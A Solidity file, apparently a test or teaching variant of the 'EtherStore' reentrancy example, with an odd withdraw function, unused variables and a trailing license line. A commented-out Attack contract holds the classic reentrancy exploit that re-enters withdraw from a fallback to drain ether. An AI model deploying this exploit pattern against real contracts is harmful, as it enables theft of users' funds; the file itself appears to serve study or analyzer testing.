error ReentrancyError();
pragma solidity ^0.8.20;

contract EtherStore  {


    int [10] i ;
    int j;
    mapping(address => uint256) balances;
    
   
    function withdraw()   external{
        
        
        if(balances[msg.sender] == 0)
            revert ReentrancyError();
        
      
        
        balances[msg.sender]--;
       
        msg.sender.call{value: 1}("");
   
        
        // balances[msg.sender]--;
        // else if(false)
        // {
            
        // }
        // else
        //     balances[msg.sender] = 1;

    }
    

    function getBalance()  public view returns (uint256) {
            

        return address(this).balance;
    }
}

// contract Attack {
//     EtherStore public etherStore;
//     uint256 public constant AMOUNT = 1 ether;

//     constructor(address _etherStoreAddress) {
//         etherStore = EtherStore(_etherStoreAddress);
//     }

//     // Fallback is called when EtherStore sends Ether to this contract.
//     fallback() external payable {
//         if (address(etherStore).balance >= AMOUNT) {
//             etherStore.withdraw();
            
//         }
//     }

//     function attack() external payable {
//         require(msg.value >= AMOUNT);
//         etherStore.deposit{value: AMOUNT}();
//         etherStore.withdraw();
//     }

//     // Helper function to check the balance of this contract
//     function getBalance() public view returns (uint256) {
//         return address(this).balance;
//     }
// }
// SPDX-License-Identifier: MIT

